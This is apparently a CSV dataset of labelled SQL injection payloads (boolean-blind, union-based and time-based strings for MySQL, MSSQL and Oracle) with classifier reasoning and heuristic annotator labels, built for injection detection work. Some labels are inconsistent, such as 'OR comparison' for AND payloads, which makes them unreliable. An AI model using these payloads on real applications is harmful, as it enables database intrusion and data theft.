payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
"1', ( select ( case when ( 1392 = 1380 ) then 1 else 1392* ( select 1392 from master..sysdatabases ) end ) )",boolean_blind,mssql,0.8,CASE WHEN for MSSQL blind,KEEP,,boolean_blind,mssql,1200,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,"1', ( select ( case when ( 1392 = 1380 ) then 1 else 1392* ( select 1392 from master..sysdatabases ) end ) )"
-4323' ) ) or 6968 = 1393,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1201,boolean_blind,generic,Pattern match: 'or 6968 = 1393' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-4323' ) ) or 6968 = 1393
"1'+ ( select gajr where 6653 = 6653 union all select null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1202,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select gajr where 6653 = 6653 union all select null,null,null,null#"
-5350 ) ) or 9323 = 9323#,boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1203,boolean_blind,generic,Pattern match: 'or 9323 = 9323' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-5350 ) ) or 9323 = 9323#
"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'nsji' = 'nsji",time_blind,oracle,0.9,dbms_pipe for Oracle time blind,KEEP,,time_blind,oracle,1204,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'nsji' = 'nsji"
"-5132%"" ) ) or 3038 = 3038",boolean_blind,generic,0.8,OR equality for blind,KEEP,,boolean_blind,generic,1205,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","-5132%"" ) ) or 3038 = 3038"
"1' in boolean mode ) and make_set ( 7804 = 3315,3315 ) #",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,1206,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1' in boolean mode ) and make_set ( 7804 = 3315,3315 ) #"
"1"" and 1668 = 8288",boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1207,boolean_blind,generic,Pattern match: 'and 1668 = 8288' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)","1"" and 1668 = 8288"
"-9821 ) as qqrm where 7152 = 7152 union all select 7152,7152,7152,7152--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,1208,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9821 ) as qqrm where 7152 = 7152 union all select 7152,7152,7152,7152--"
1' ) rlike sleep ( 5 ) and ( 'tslp' = 'tslp,time_blind,generic,0.9,sleep() with rlike for time blind,KEEP,,time_blind,generic,1209,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) rlike sleep ( 5 ) and ( 'tslp' = 'tslp
"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""zvew"" like ""zvew",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1210,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""zvew"" like ""zvew"
select sleep ( 5 ) and ( ( 'keoy' = 'keoy,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,1211,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,select sleep ( 5 ) and ( ( 'keoy' = 'keoy
1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'njge' like 'njge,boolean_blind,postgresql,0.8,IN with char for blind,KEEP,,boolean_blind,postgresql,1212,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'njge' like 'njge
1 ) where 2543 = 2543,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,1213,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) where 2543 = 2543
1 and 6802 = 3592--,boolean_blind,generic,0.8,OR comparison for blind,KEEP,,boolean_blind,generic,1214,boolean_blind,generic,Pattern match: 'and 6802 = 3592' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 and 6802 = 3592--
